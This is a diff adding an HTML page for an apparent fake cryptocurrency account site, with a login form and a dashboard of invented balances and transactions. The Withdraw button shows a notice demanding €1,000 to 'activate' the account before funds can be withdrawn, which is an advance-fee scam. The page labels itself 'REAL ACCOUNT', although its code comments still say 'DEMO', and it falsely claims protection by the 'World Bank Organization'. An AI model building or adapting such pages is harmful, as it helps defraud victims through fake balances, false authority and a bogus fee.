@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>Crypto Account</title>
+
+    <link rel="stylesheet" href="style.css">
+
+</head>
+
+
+<body>
+
+
+<!-- ==================================================
+     LOGIN PAGE
+================================================== -->
+
+<div id="loginPage" class="login-page">
+
+    <div class="login-box">
+
+
+        <!-- LOGO -->
+
+        <div class="logo">
+            ₿
+        </div>
+
+
+        <!-- TITLE -->
+
+        <h1>
+            Crypto Account
+        </h1>
+
+
+        <p
+            class="subtitle"
+            id="loginSubtitle">
+
+            Sign in to your Crypto account
+
+        </p>
+
+
+        <!-- DEMO NOTICE -->
+
+        <div class="demo-warning">
+
+            REAL ACCOUNT
+
+        </div>
+
+
+        <!-- LOGIN FORM -->
+
+        <form id="loginForm">
+
+
+            <!-- USERNAME -->
+
+            <label id="usernameLabel">
+
+                Username
+
+            </label>
+
+
+            <input
+                type="text"
+                id="username"
+                placeholder="Enter username"
+                autocomplete="off"
+                autocapitalize="none"
+                required>
+
+
+            <!-- PASSWORD -->
+
+            <label id="passwordLabel">
+
+                Password
+
+            </label>
+
+
+            <div class="password-box">
+
+
+                <input
+                    type="password"
+                    id="password"
+                    placeholder="Enter password"
+                    autocomplete="off"
+                    required>
+
+
+                <button
+                    type="button"
+                    id="showPassword">
+
+                    Show
+
+                </button>
+
+
+            </div>
+
+
+            <!-- ERROR -->
+
+            <p
+                id="loginError"
+                class="error">
+            </p>
+
+
+            <!-- LOGIN BUTTON -->
+
+            <button
+                type="submit"
+                class="login-button"
+                id="loginButton">
+
+                Login
+
+            </button>
+
+
+        </form>
+
+
+        <!-- DEMO NOTE -->
+
+        <p class="demo-note">
+
+            This account is under the protection of World Bank Organization
+
+        </p>
+
+
+    </div>
+
+</div>
+
+
+
+<!-- ==================================================
+     DASHBOARD
+================================================== -->
+
+<div
+    id="dashboardPage"
+    class="dashboard-page hidden">
+
+
+    <div class="container">
+
+
+        <!-- DEMO LABEL -->
+
+        <div
+            class="demo-label"
+            id="dashboardDemo">
+
+            CRYPTO ACCOUNT
+
+        </div>
+
+
+
+        <!-- HEADER -->
+
+        <header>
+
+
+            <div>
+
+                <p
+                    class="small-text"
+                    id="welcomeText">
+
+                    Welcome back
+
+                </p>
+
+
+                <h1 id="customerName">
+
+                    customer
+
+                </h1>
+
+            </div>
+
+
+            <!-- PROFILE -->
+
+            <div
+                class="profile"
+                id="profile">
+
+                CU
+
+            </div>
+
+
+        </header>
+
+
+
+        <!-- ==================================================
+             BALANCE
+        ================================================== -->
+
+        <section class="balance-card">
+
+
+            <p id="balanceTitle">
+
+                Total Account Balance
+
+            </p>
+
+
+            <h2 id="totalBalance">
+
+                $0.00
+
+            </h2>
+
+
+            <span class="profit">
+
+                + $1,240.50 (5.25%)
+
+            </span>
+
+
+            <div class="card-bottom">
+
+
+                <span id="portfolioText">
+
+                    Crypto value
+
+                </span>
+
+
+                <span id="demoDataText">
+
+                    Account data only
+
+                </span>
+
+
+            </div>
+
+
+        </section>
+
+
+
+        <!-- ==================================================
+             WITHDRAWAL
+        ================================================== -->
+
+        <button
+            id="withdrawButton"
+            class="withdraw-button">
+
+            Withdraw
+
+        </button>
+
+
+        <div
+            id="withdrawMessage"
+            class="withdraw-message hidden">
+
+
+            <strong id="withdrawTitle">
+
+                Account Withdrawal Notice
+
+            </strong>
+
+
+            <p id="withdrawText">
+
+                Account is not yet activated, kindly pay €1,000.00 to activate account before you can withdraw
+            </p>
+
+
+            <button
+                type="button"
+                id="closeWithdraw">
+
+                Close
+
+            </button>
+
+
+        </div>
+
+
+
+        <!-- ==================================================
+             ASSETS
+        ================================================== -->
+
+        <h3 id="assetsTitle">
+
+            My Assets
+
+        </h3>
+
+
+        <section class="assets">
+
+
+            <!-- BITCOIN -->
+
+            <div class="asset">
+
+
+                <div class="coin-icon btc">
+
+                    ₿
+
+                </div>
+
+
+                <div class="asset-info">
+
+
+                    <strong id="bitcoinName">
+
+                        Bitcoin
+
+                    </strong>
+
+
+                    <span>
+
+                        BTC
+
+                    </span>
+
+
+                </div>
+
+
+                <div class="asset-value">
+
+
+                    <strong>
+
+                        0.285 BTC
+
+                    </strong>
+
+
+                    <span>
+
+                        $18,420.00
+
+                    </span>
+
+
+                </div>
+
+
+            </div>
+
+
+
+            <!-- USDT -->
+
+            <div class="asset">
+
+
+                <div class="coin-icon usdt">
+
+                    $
+
+                </div>
+
+
+                <div class="asset-info">
+
+
+                    <strong id="tetherName">
+
+                        Tether
+
+                    </strong>
+
+
+                    <span>
+
+                        USDT
+
+                    </span>
+
+
+                </div>
+
+
+                <div class="asset-value">
+
+
+                    <strong>
+
+                        6,430 USDT
+
+                    </strong>
+
+
+                    <span>
+
+                        $6,430.00
+
+                    </span>
+
+
+                </div>
+
+
+            </div>
+
+
+        </section>
+
+
+
+        <!-- ==================================================
+             TRANSACTIONS TITLE
+        ================================================== -->
+
+        <div class="section-title">
+
+
+            <h3 id="transactionsTitle">
+
+                Recent Transactions
+
+            </h3>
+
+
+            <span id="demoText">
+
+                Crypto
+
+            </span>
+
+
+        </div>
+
+
+
+        <!-- ==================================================
+             TRANSACTIONS
+        ================================================== -->
+
+        <section class="transactions">
+
+
+            <!-- TRANSACTION 1 -->
+
+            <div class="transaction">
+
+
+                <div
+                    class="transaction-icon received">
+
+                    ↓
+
+                </div>
+
+
+                <div class="transaction-info">
+
+
+                    <strong id="bitcoinReceived">
+
+                        Bitcoin received
+
+                    </strong>
+
+
+                    <span>
+
+                        Aug 27, 2026
+
+                    </span>
+
+
+                </div>
+
+
+                <div class="transaction-amount">
+
+
+                    <strong>
+
+                        +0.025 BTC
+
+                    </strong>
+
+
+                    <span id="received1">
+
+                        Received
+
+                    </span>
+
+
+                </div>
+
+
+            </div>
+
+
+
+            <!-- TRANSACTION 2 -->
+
+            <div class="transaction">
+
+
+                <div
+                    class="transaction-icon sent">
+
+                    ↑
+
+                </div>
+
+
+                <div class="transaction-info">
+
+
+                    <strong id="usdtSent">
+
+                        USDT sent
+
+                    </strong>
+
+
+                    <span>
+
+                        Aug 27, 2026
+
+                    </span>
+
+
+                </div>
+
+
+                <div class="transaction-amount">
+
+
+                    <strong>
+
+                        -500 USDT
+
+                    </strong>
+
+
+                    <span id="sent1">
+
+                        Sent
+
+                    </span>
+
+
+                </div>
+
+
+            </div>
+
+
+
+            <!-- TRANSACTION 3 -->
+
+            <div class="transaction">
+
+
+                <div
+                    class="transaction-icon received">
+
+                    ↓
+
+                </div>
+
+
+                <div class="transaction-info">
+
+
+                    <strong id="usdtReceived">
+
+                        USDT received
+
+                    </strong>
+
+
+                    <span>
+
+                        Aug 27, 2026
+
+                    </span>
+
+
+                </div>
+
+
+                <div class="transaction-amount">
+
+
+                    <strong>
+
+                        +1,200 USDT
+
+                    </strong>
+
+
+                    <span id="received2">
+
+                        Received
+
+                    </span>
+
+
+                </div>
+
+
+            </div>
+
+
+        </section>
+
+
+
+        <!-- ==================================================
+             LOGOUT
+        ================================================== -->
+
+        <button
+            id="logoutButton"
+            class="logout-button">
+
+            Logout
+
+        </button>
+
+
+
+        <!-- FOOTER -->
+
+        <footer>
+
+            This account is under the protection of World Bank Organization
+        </footer>
+
+
+    </div>
+
+</div>
+
+
+
+<!-- ==================================================
+     JAVASCRIPT
+================================================== -->
+
+<script src="script.js"></script>
+
+
+</body>
+
+</html>
